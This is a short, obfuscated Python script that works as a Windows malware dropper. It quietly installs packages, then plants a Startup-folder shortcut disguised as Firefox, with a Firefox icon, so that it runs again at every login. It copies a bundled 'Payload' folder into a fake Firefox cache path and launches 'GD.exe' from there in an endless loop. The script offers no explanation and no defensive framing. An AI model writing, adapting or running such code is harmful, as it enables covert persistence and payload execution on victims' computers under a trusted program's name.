import subprocess as G,os as A
from sys import executable as I
from time import sleep
for J in ['pywin32','psutil','shutil']:
	try:G.check_call([I,'-m','pip','install',J])
	except:pass
import psutil as K,shutil as D
from win32com.client import Dispatch as L
B='Firefox'
E=f"C:\\{B}\\Cache\\Disk Cache\\"
F='3.8.2023'
C=A.path.dirname(__file__)
H='GD.exe'
def M():E=f"{A.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{B}.lnk";F=__file__;G=L('WScript.Shell');D=G.CreateShortCut(E);print(A.path.join(C,f"{B}.ico"));D.IconLocation=A.path.join(C,f"{B}.ico");D.Targetpath=F;D.WorkingDirectory=C;D.save()
def N():
	try:D.rmtree(A.path.join(E,F))
	except:pass
	D.copytree(A.path.join(C,'Payload'),A.path.join(E,F),copy_function=D.copy);G.call(A.path.join(E,F,H))
def O():return H in(A.name()for A in K.process_iter())
M()
while True:N()